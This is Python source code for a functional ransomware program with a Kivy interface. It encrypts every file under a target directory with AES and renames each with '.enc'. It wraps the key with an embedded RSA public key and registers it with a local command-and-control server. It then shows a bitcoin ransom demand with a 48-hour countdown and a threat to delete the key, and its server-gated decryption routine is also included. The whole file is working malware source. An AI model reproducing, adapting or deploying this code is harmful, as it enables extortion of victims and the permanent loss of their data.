import os, json, time
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from Crypto.Random import get_random_bytes
from Crypto.Random.random import getrandbits
from Crypto.PublicKey import RSA
import binascii
from Crypto.Hash import BLAKE2b
from Crypto.Cipher import PKCS1_OAEP
import requests
from Crypto.Cipher import AES
from kivy.uix.label import Label
from kivy.properties import StringProperty
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.uix.button import Button
from threading import Thread

#### Definitions ####

publicKey = RSA.importKey(binascii.unhexlify(
    "30820222300d06092a864886f70d0101010500038"
    "2020f003082020a02820201009262f0420d27ce70"
    "b9a8ea94597e361a9ccbdbbc3ffb47e7e4a4bcdf7"
    "716a1148b06644363f4c9b2532300fe43c94aae86"
    "40d0e12539f6ce7606dd3775122ad12d67516a62a"
    "9aaa78ed684d441d94eaeabd930b08aae535b009e"
    "ee4039b578e4d4a5eb1e11a77783940f7e87c81e3"
    "fe4206e0e1d059c2c3fda64f71bf782c9bb4ee071"
    "1197191d6b9a2837d243ba083070253c28a233f1f"
    "70de23a473c0b8e52819f6acdc5c17641f69f00d0"
    "42df9f82def83a1d9789a694bcd25359871a9af97"
    "4f4fbc5387ad5f4fbeb320f7a6d41218519dc6b9f"
    "be9b1ff76034ac338eeeb9dec48ffc0a7cb007163"
    "d875c5b68e4c8c8d89fc7eac25d97b7428879f49f"
    "6ac0b3ef72a318b2fd62ff0b6ae690b4b7bb4cd2c"
    "34a0941c15f12cc84bcc95a41e0911b3d6580d3ec"
    "5f17634a96d821258d0d592e72d53bc35118ef152"
    "94d22c41fb8511077c7f1001b190d25ae3722c1ab"
    "2f34e6708ad8400b5a277e2b088872b981ae0c352"
    "e9377815755c7e78051704c38e49f62571a64b716"
    "a98365f841001ae3bba07ed9b430ef519b954cab8"
    "74b93e8d4f98786746e967eac019b8d6ba11f9a0b"
    "4ba4972b776d5729bf41760b585a7bdb30a2c49b5"
    "89c05f9f821d4396941b7ad3cc2420a1d8b91475a"
    "6c6442ace7ae5cd690be15230ed96556a8f402e3c"
    "eb152be817914f1b8e17a5bd7a4187cbc5c77ba51"
    "41997b72a0a84ec1f286b3770203010001"))

key = BLAKE2b.new(key=get_random_bytes(64), digest_bits=128).hexdigest().encode()
root = "b/"
extension = '.enc'
ignore = ['Windows']

#### Functions ####

def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_OFB)
    data = binascii.hexlify(cipher.encrypt(data))
    data = binascii.hexlify(cipher.iv).decode() + '$' + data.decode()
    return data.encode()

def decrypt(data, key):
    data = data.decode().split("$")
    iv = binascii.unhexlify(data[0])
    ct = binascii.unhexlify(data[1])
    cipher = AES.new(key.encode(), AES.MODE_OFB, iv=iv)
    return cipher.decrypt(ct)
    

def start():
    file = [f for sub, dirs, files in os.walk(os.path.expandvars('%tmp%/')) for f in files if f.endswith('.uniqueid')]
    if file:
        if not os.path.isfile(os.path.expandvars('%APPDATA%/importantinfo')):
            r = requests.get(url=f'http://127.0.0.1:5000/victim/{file[0].replace(".uniqueid", "")}')
            with open(os.path.expandvars("%APPDATA%/importantinfo"), 'w') as f:
                data = json.dumps({'unique_id': file[0].replace(".uniqueid", ""), 'crypto_address': r.json()['crypto_address'],
                                   'expiration': r.json()['expiration']})
                f.write(data)
        return
    for subdir, dirs, files in os.walk(root, topdown=True):
        dirs[:] = [d for d in dirs if d not in ignore]
        for file in files:
            filepath = subdir + os.sep + file
            with open(filepath, 'r+b') as f:
                file = encrypt(f.read(), key)
                f.seek(0)
                f.truncate(0)
                f.write(file)
                f.close()
            os.rename(filepath, filepath+extension)
    encrypted_key = binascii.hexlify(PKCS1_OAEP.new(publicKey).encrypt(key)).decode()
    r = requests.post(url='http://127.0.0.1:5000/api/register', data={'encrypted_key': encrypted_key})
    with open(os.path.expandvars("%APPDATA%/importantinfo"), 'w') as f, open(os.path.expandvars(f"%tmp%/{r.json()['unique_id']}.uniqueid"), 'w') as t:
        data = json.dumps({'unique_id': r.json()['unique_id'], 'crypto_address': r.json()['crypto_address'],
                           'expiration': r.json()['expiration']})
        f.write(data)





#### Kivy ####


class ransom(GridLayout):
    def __init__(self):
        super(ransom, self).__init__()
        with open(os.path.expandvars("%APPDATA%/importantinfo"), 'r') as f:
            conf = json.loads(f.read())
            self.expiration = conf['expiration']
            self.address = conf['crypto_address']
            self.unique_id = conf['unique_id']
            self.clock = Clock.schedule_interval(self.update, 1)
        self.ids.informationaltext.text = "Uh oh, looks like you went and got some [b]ransomware[/b]. Now relax none of your files are gone they are just encrypted, to get them back all you have to do is pay 0.002 bitcoin to [color=#][b]" + self.address + "[/b][/color]. If you don\'t pay up within 48 hours the key needed to recover your files will be deleted and your data will be gone forever."


    def update(self, dt):
        if round(time.time()) >= self.expiration:
            self.ids.informationaltext.text = 'Uh oh, looks like you didn\'t pay and now you will PAY!!\n Your key has been deleted from our system, and you will NEVER see your personal data again, unless you have a backup. GOOD DAY.'
            self.ids.informationaltext.font_size = 35
            self.ids.countdown.text = ''
            self.ids.verify_button.clear_widgets()
            Clock.unschedule(self.clock)
            return
        current = self.expiration - round(time.time())
        days, excess = (current // 86400) % 86400, current % 86400
        hours, excess = (excess // 3600) % 24, excess % 3600
        minutes, excess = (excess // 60) % 60, excess % 60
        seconds = excess % 60
        self.ids.countdown.text = f' Time until data is irrecoverable: \n{days} DAYS. {hours} HOURS. {minutes} MIN. {seconds} SEC.'


    def verify(self):
        r = requests.get(f'http://127.0.0.1:5000/verify/{self.unique_id}')
        if r.text == 'error':
            false_popup().open()
        else:
            try:
                test = AES.new(r.text.encode(), AES.MODE_OFB)
                self.pop = true_popup()
                self.pop.open()
                self.pop.ids.decrypting.max = self.count()
                t = Thread(target=self.decrypt, args=(r.text,))
                t.start()
            except Exception as e:
                self.pop.ids.dec_layout.remove_widget(self.pop.ids.decrypting)
                self.pop.ids.dec_layout.remove_widget(self.pop.ids.percent)
                self.pop.title = 'error'
                self.pop.ids.dec1.text = 'Error'
                self.pop.ids.dec2.text = str(e)
                bt = btn()
                bt.bind(on_release=self.pop.dismiss)
                self.pop.ids.dec_layout.add_widget(bt)


    def count(self):
        count = 0
        for subdir, dirs, files in os.walk(root, topdown=True):
            dirs[:] = [d for d in dirs if d not in ignore]
            for file in files:
                if file.endswith(extension):
                    count += 1
        return count


    def decrypt(self, key):
        try:
            for subdir, dirs, files in os.walk(root, topdown=True):
                dirs[:] = [d for d in dirs if d not in ignore]
                for file in files:
                    filepath = subdir + os.sep + file
                    if file.endswith(extension):
                        with open(filepath, 'r+b') as f:
                            file = decrypt(f.read(), key)
                            f.seek(0)
                            f.truncate(0)
                            f.write(file)
                            f.close()
                        os.rename(filepath, filepath.replace(".enc", ""))
                        self.pop.ids.decrypting.value += 1
                        self.pop.ids.percent.text = str(round(self.pop.ids.decrypting.value_normalized*100)) + '%'
                    else:
                        continue
            self.ids.countdown.text = ''
            self.ids.verify_button.clear_widgets()
            Clock.unschedule(self.clock)
            self.ids.informationaltext.text = 'Congratulations, all your files should be just as you left them, I will now delete myself.'
            os.remove(os.path.expandvars('%APPDATA%/importantinfo'))
            os.remove(os.path.expandvars(f'%TEMP%/{self.unique_id}.uniqueid'))
            self.pop.dismiss()
        except:
            return False

class true_popup(Popup):
    pass

class false_popup(Popup):
    pass

class btn(Button):
    pass

class ransomApp(App):
    def build(self):
        return ransom()

if __name__ == '__main__':
    start()
    ransomApp().run()